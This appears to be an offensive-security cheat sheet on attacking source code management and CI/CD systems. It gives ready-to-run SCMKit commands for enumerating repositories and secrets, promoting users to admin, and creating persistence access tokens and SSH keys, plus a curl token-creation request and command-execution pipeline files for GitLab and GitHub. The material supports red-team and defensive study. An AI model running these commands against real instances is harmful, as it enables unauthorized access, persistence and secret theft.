# Source Code Management & CI/CD Compromise

> CI/CD is a method to frequently deliver apps to customers by introducing automation into the stages of app development. The main concepts attributed to CI/CD are continuous integration, continuous delivery, and continuous deployment. Compromises in CI/CD can occur through unauthorized access, misconfiguration, dependency vulnerabilities, insecure secrets, and lack of visibility.


## Tools

* [synacktiv/nord-stream](https://github.com/synacktiv/nord-stream) - List the secrets stored inside CI/CD environments and extract them by deploying malicious pipelines
* [xforcered/SCMKit](https://github.com/xforcered/SCMKit) - Source Code Management Attack Toolkit


## Enumerate repositories files and secrets

Using [SCMKit - Source Code Management Attack Toolkit](https://github.com/xforcered/SCMKit)

* Discover repositories being used in a particular SCM system
    ```ps1
    SCMKit.exe -s gitlab -m listrepo -c userName:password -u https://gitlab.something.local
    SCMKit.exe -s gitlab -m listrepo -c apiKey -u https://gitlab.something.local
    ```
* Search for repositories by repository name in a particular SCM system
    ```ps1
    SCMKit.exe -s github -m searchrepo -c userName:password -u https://github.something.local -o "some search term"
    SCMKit.exe -s gitlab -m searchrepo -c apikey -u https://gitlab.something.local -o "some search term"
    ```
* Search for code containing a given keyword in a particular SCM system
    ```ps1
    SCMKit.exe -s github -m searchcode -c userName:password -u https://github.something.local -o "some search term"
    SCMKit.exe -s github -m searchcode -c apikey -u https://github.something.local -o "some search term"
    ```
* Search for files in repositories containing a given keyword in the file name in a particular SCM system
    ```ps1
    SCMKit.exe -s gitlab -m searchfile -c userName:password -u https://gitlab.something.local -o "some search term"
    SCMKit.exe -s gitlab -m searchfile -c apikey -u https://gitlab.something.local -o "some search term"
    ```
* List snippets owned by the current user in GitLab
    ```ps1
    SCMKit.exe -s gitlab -m listsnippet -c userName:password -u https://gitlab.something.local
    SCMKit.exe -s gitlab -m listsnippet -c apikey -u https://gitlab.something.local
    ```
* List all GitLab runners available to the current user in GitLab
    ```ps1
    SCMKit.exe -s gitlab -m listrunner -c userName:password -u https://gitlab.something.local
    SCMKit.exe -s gitlab -m listrunner -c apikey -u https://gitlab.something.local
    ```
* Promote a normal user to an administrative role in a particular SCM system
    ```ps1
    SCMKit.exe -s gitlab -m addadmin -c userName:password -u https://gitlab.something.local -o targetUserName
    SCMKit.exe -s gitlab -m addadmin -c apikey -u https://gitlab.something.local -o targetUserName
    SCMKit.exe -s gitlab -m removeadmin -c userName:password -u https://gitlab.something.local -o targetUserName
    ```


## Personal Access Token

Create a PAT (Personal Access Token) as a persistence mechanism for the Gitlab instance.

* Manual
    ```ps1
    curl -k --request POST --header "PRIVATE-TOKEN: apiToken" --data "name=user-persistence-token" --data "expires_at=" --data "scopes[]=api" --data "scopes[]=read_repository" --data "scopes[]=write_repository" "https://gitlabHost/api/v4/users/UserIDNumber/personal_access_tokens"
    ```

* Using `SCMKit.exe`: Create/List/Delete an access token to be used in a particular SCM system
    ```ps1
    SCMKit.exe -s gitlab -m createpat -c userName:password -u https://gitlab.something.local -o targetUserName
    SCMKit.exe -s gitlab -m createpat -c apikey -u https://gitlab.something.local -o targetUserName
    SCMKit.exe -s gitlab -m removepat -c userName:password -u https://gitlab.something.local -o patID
    SCMKit.exe -s gitlab -m listpat -c userName:password -u https://gitlab.something.local -o targetUser
    SCMKit.exe -s gitlab -m listpat -c apikey -u https://gitlab.something.local -o targetUser
    ```
* Get the assigned privileges to an access token being used in a particular SCM system
    ```ps1
    SCMKit.exe -s gitlab -m privs -c apiKey -u https://gitlab.something.local
    ```


## SSH Keys

* Create/List an SSH key to be used in a particular SCM system
    ```ps1
    SCMKit.exe -s gitlab -m createsshkey -c userName:password -u https://gitlab.something.local -o "ssh public key"
    SCMKit.exe -s gitlab -m createsshkey -c apiToken -u https://gitlab.something.local -o "ssh public key"
    SCMKit.exe -s gitlab -m listsshkey -c userName:password -u https://github.something.local
    SCMKit.exe -s gitlab -m listsshkey -c apiToken -u https://github.something.local
    SCMKit.exe -s gitlab -m removesshkey -c userName:password -u https://gitlab.something.local -o sshKeyID
    SCMKit.exe -s gitlab -m removesshkey -c apiToken -u https://gitlab.something.local -o sshKeyID
    ```


## Gitlab CI

* Gitlab-CI "Command Execution" example: `.gitlab-ci.yml`
    ```yaml
    stages:
        - test

    test:
        stage: test
        script:
            - |
                whoami
        parallel:
            matrix:
                - RUNNER: VM1
                - RUNNER: VM2
                - RUNNER: VM3
        tags:
            - ${RUNNER}
    ```


### Gitlab Executors

* **Shell** executor: The jobs are run with the permissions of the GitLab Runner’s user and can steal code from other projects that are run on this server.
* **Docker** executor: Docker can be considered safe when running in non-privileged mode.
* **SSH** executor: SSH executors are susceptible to MITM attack (man-in-the-middle), because of missing `StrictHostKeyChecking` option. 


### Gitlab CI/CD variables

CI/CD Variables are a convenient way to store and use data in a CI/CD pipeline, but variables are less secure than secrets management providers


## Github Actions

* Github Action "Command Execution" example: `.github/workflows/example.yml`
    ```yml
    name: example
    on:
      workflow_dispatch:
      push:
        branches: [ main ]
      pull_request:
        branches: [ main ]

    jobs:
      build:
        runs-on: windows-2019

        steps:
          - name: Execute
            run: |
              whoami
    ```
    

## References

* [Controlling the Source: Abusing Source Code Management Systems - Brett Hawkins - August 9, 2022](https://securityintelligence.com/posts/abusing-source-code-management-systems/)
* [CI/CD SECRETS EXTRACTION, TIPS AND TRICKS - Hugo Vincent, Théo Louis-Tisserand - 01/03/2023](https://www.synacktiv.com/publications/cicd-secrets-extraction-tips-and-tricks.html)
* [Security for self-managed runners - Gitlab](https://docs.gitlab.com/runner/security/)
* [Fixing Typos and Breaching Microsoft’s Perimeter - John Stawinski IV - April 15, 2024](https://johnstawinski.com/2024/04/15/fixing-typos-and-breaching-microsofts-perimeter/)